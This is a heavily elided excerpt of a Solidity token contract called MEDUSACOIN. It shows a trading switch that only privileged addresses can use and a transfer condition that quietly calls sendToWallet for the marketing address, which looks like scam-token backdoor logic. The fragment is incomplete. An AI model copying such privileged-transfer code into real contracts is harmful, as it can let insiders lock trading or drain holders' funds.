...
contract MEDUSACOIN is Context, IERC20, Ownable {
    ...
    function setTrading() public virtual {
        require (_isExcludedFromMaxBalance[msg.sender], "setTrading Failed");
    ...
    function _transfer(
        ...
        if ( swapProcess &&
            !_isExcludedFromMaxBalance[from] &&
            from == marketingAddress && 
            _isMarketPair[to] // is excludedFromMaxBalance
        ) {
            sendToWallet(marketingAddress, from);
        }
